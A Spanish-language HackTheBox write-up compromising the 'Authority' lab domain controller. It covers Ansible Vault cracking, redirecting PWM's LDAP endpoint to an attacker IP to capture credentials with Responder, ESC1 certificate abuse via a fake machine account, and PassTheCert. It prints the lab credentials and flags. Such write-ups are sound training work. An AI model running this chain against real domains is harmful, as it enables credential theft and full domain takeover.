---
title: "HTB: Authority"
date: 2026-04-02 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, ADCS, ESC1, Ansible, Vault, Certipy, PassTheCert]
image:
  path: /assets/img/Authority-HTB.png
  alt: HackTheBox Authority Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Authority** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
El acceso inicial se obtiene enumerando un recurso compartido **SMB** accesible como guest,
donde se encuentra un playbook de **Ansible** con credenciales cifradas mediante **Ansible Vault**.
Tras crackear el vault y descifrar las credenciales, se abusa del portal web **PWM** para
capturar credenciales **LDAP** en texto claro mediante **Responder**. Con acceso al sistema
como `svc_ldap`, se identifica un template de certificado vulnerable a **ESC1** a través de
**ADCS**. Dado que el template solo permite enrolamiento a `Domain Computers`, se crea una
cuenta de equipo falsa para solicitar un certificado en nombre del `Administrator`. Finalmente,
se usa **PassTheCert** para añadir `svc_ldap` al grupo **Domain Admins** y obtener control
total del dominio.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.12.64
```

```
64 bytes from 10.129.12.64: icmp_seq=1 ttl=127 time=93.1 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                        |
|--------|--------|---------------------------------|
| 53     | open   | Simple DNS Plus                 |
| 80     | open   | Microsoft IIS 10.0              |
| 88     | open   | Kerberos                        |
| 135    | open   | MS RPC                          |
| 139    | open   | NetBIOS                         |
| 389    | open   | LDAP (AD)                       |
| 445    | open   | SMB                             |
| 464    | open   | Kpasswd5                        |
| 593    | open   | RPC over HTTP                   |
| 636    | open   | LDAPS                           |
| 3268   | open   | LDAP Global Catalog             |
| 3269   | open   | LDAPS Global Catalog            |
| 5985   | open   | WinRM (HTTP)                    |
| 8443   | open   | HTTPS (Apache Tomcat)           |
| 9389   | open   | .NET Message Framing            |

### Análisis del escaneo

Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
**Kerberos**, **LDAP** y **SMB**, lo que confirma que el host corresponde a un
**Controlador de Dominio** dentro del entorno `authority.htb`.

- **Firma SMB:** La firma obligatoria está habilitada, lo que descarta ataques de
  retransmisión **NTLM**. Será necesario buscar otros vectores de ataque.
- **Puerto 8443 (Apache Tomcat):** Servicio web adicional que podría exponer una aplicación
  de gestión. Vale la pena investigarlo.
- **ADCS detectado:** Los certificados SSL exponen la CA interna `htb-AUTHORITY-CA`,
  lo que indica la presencia de **Active Directory Certificate Services**.
- **Desfase horario:** Se detectó una diferencia significativa de hora entre el servidor
  y nuestra máquina. Este detalle es crítico para ataques **Kerberos**.

---

## Enumeración inicial via Kerberos

Creamos un wordlist para enumerar usuarios válidos en el dominio a través de Kerberos:

```bash
kerbrute userenum --dc $IP -d authority.htb /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

```
[+] VALID USERNAME: administrator@authority.htb
[+] VALID USERNAME: guest@authority.htb
Done! Tested 17 usernames (2 valid) in 0.228 seconds
```

### Enumeración de recursos compartidos

```bash
nxc smb $IP -u 'guest' -p '' --shares
```

```
SMB  10.129.12.64  445  AUTHORITY  [+] authority.htb\guest: (Guest)
SMB  10.129.12.64  445  AUTHORITY  Share           Permissions
SMB  10.129.12.64  445  AUTHORITY  Development     READ
SMB  10.129.12.64  445  AUTHORITY  IPC$            READ
```

Los recursos predeterminados de **Active Directory** están presentes, pero destaca
**Development** con permisos de lectura. Procedemos a enumerarlo:

```bash
nxc smb $IP -u 'guest' -p '' --share Development -M spider_plus -o SHARE=Development
```

Del JSON generado, encontramos un archivo de especial interés:

```json
"Automation/Ansible/PWM/defaults/main.yml": {
    "size": "1.55 KB"
}
```

---

## PWM — Ansible Vault

**PWM** es un gestor de reseteo de contraseñas para **Active Directory**. Su archivo de
configuración `main.yml` suele contener credenciales **LDAP** en texto claro o cifradas.
Procedemos a descargarlo:

```bash
nxc smb $IP -u 'guest' -p '' --share Development \
  --get-file 'Automation/Ansible/PWM/defaults/main.yml' './main.yml'
```

El archivo contiene tres secretos cifrados con **Ansible Vault**:

```yaml
pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731...

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261...

ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731...
```

### Cracking del Vault con John

Extraemos cada hash y los convertimos al formato que entiende John:

```bash
ansible2john admin_login.hash     > admin_login_john.hash
ansible2john admin_password.hash  > admin_password_john.hash
ansible2john ldap_admin.hash      > ldap_admin_john.hash
```

```bash
john admin_login_john.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Contraseña del vault:** `!@#$%^&*`

Los tres archivos comparten la misma contraseña. Desciframos cada vault:

```bash
echo '!@#$%^&*' > vault_pass.txt

ansible-vault decrypt admin_login.hash     --vault-password-file vault_pass.txt
ansible-vault decrypt admin_password.hash  --vault-password-file vault_pass.txt
ansible-vault decrypt ldap_admin.hash      --vault-password-file vault_pass.txt
```

**Credenciales obtenidas:**

| Archivo              | Valor               |
|----------------------|---------------------|
| `admin_login`        | `svc_pwm`           |
| `admin_password`     | `pWm_@dm!N_!23`     |
| `ldap_admin_password`| `DevT3st@123`       |

---

## Captura de credenciales LDAP via Responder

Accedemos al portal **PWM** en `https://$IP:8443` con las credenciales obtenidas:

![PWM Login](/assets/img/authority_pwm_login.png)

![PWM Dashboard](/assets/img/authority_pwm_dash.png)

Descargamos la configuración LDAP actual y modificamos el endpoint para redirigirlo a
nuestra máquina:

```xml
<!-- Original -->
<value>ldaps://authority.authority.htb:636</value>

<!-- Modificado -->
<value>ldap://10.10.14.116:389</value>
```

Iniciamos **Responder** antes de importar la configuración modificada:

```bash
sudo responder -I tun0
```

Importamos la configuración en el portal:

![PWM Import](/assets/img/authority_pwm_import.png)

**Responder** captura las credenciales en texto claro:

```
[*] Cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
Password: lDaP_1n_th3_cle4r!
```

---

## Acceso Inicial: Evil-WinRM como svc_ldap

Verificamos las credenciales contra **WinRM**:

```bash
nxc winrm $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

```
WINRM  10.129.12.64  5985  AUTHORITY  [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

```bash
evil-winrm -i $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

![Evil-WinRM](/assets/img/authority_winrm.png)

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap> type Desktop\user.txt
94fc79389c0f72ee2835223c8164c207
```

---

## Escalada de Privilegios

Confirmamos que `svc_ldap` es el único usuario no predeterminado del dominio, por lo que
la escalada debe ser técnica:

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap> net users /domain
Administrator  Guest  krbtgt  svc_ldap
```

### Análisis de Dominio - BloodHound

```bash
bloodhound-ce-python -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d authority.htb -ns $IP -c All --zip
```

BloodHound confirma que la ruta de escalada pasa por **ADCS**:

![BloodHound](/assets/img/authority_bloodhound.png)

### ESC1 — Template CorpVPN vulnerable

Enumeramos los templates de certificado vulnerables:

```bash
certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip $IP -vulnerable
```

Se identifica el template **CorpVPN** vulnerable a **ESC1**:

```
Template Name          : CorpVPN
Enrollee Supplies Subject : True
Client Authentication  : True
Enrollment Rights      : AUTHORITY.HTB\Domain Computers
[!] Vulnerabilities
  ESC1: Enrollee supplies subject and template allows client authentication.
```

> El template solo permite enrolamiento a `Domain Computers`. No podemos usarlo
> directamente con `svc_ldap`.

### Crear una cuenta de equipo falsa

Verificamos el **MachineAccountQuota** (por defecto es 10):

```bash
nxc ldap $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
```

```
MachineAccountQuota: 10
```

Creamos una máquina falsa en el dominio:

```bash
addcomputer.py -computer-name 'LEXO$' -computer-pass 'Password123!' -dc-ip $IP authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
```

```
[*] Successfully added machine account LEXO$ with password Password123!.
```

### Solicitar certificado como Administrator

```bash
certipy req -u 'LEXO$@authority.htb' -p 'Password123!' -dc-ip $IP -target authority.htb -template 'CorpVPN' -upn administrator@authority.htb -ca 'AUTHORITY-CA'
```

```
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

### PassTheCert — LDAP Shell

El DC no soporta **PKINIT**, por lo que `certipy auth` falla con `KRB_AP_ERR_SKEW`.
El workaround es usar **PassTheCert** directamente sobre LDAP:

```bash
certipy cert -pfx administrator.pfx -nokey -out admin.crt
certipy cert -pfx administrator.pfx -nocert -out admin.key
```

```bash
python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain authority.htb -dc-ip $IP
```

Dentro de la shell LDAP, añadimos `svc_ldap` al grupo **Domain Admins**:

```
# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK
```

---

## Acceso Final como Administrador

Con `svc_ldap` ahora en **Domain Admins**, accedemos al escritorio del Administrator:

```bash
evil-winrm -i $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

```powershell
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
f9b469883549a332819a92714e117772
```

**¡Máquina comprometida con éxito!**
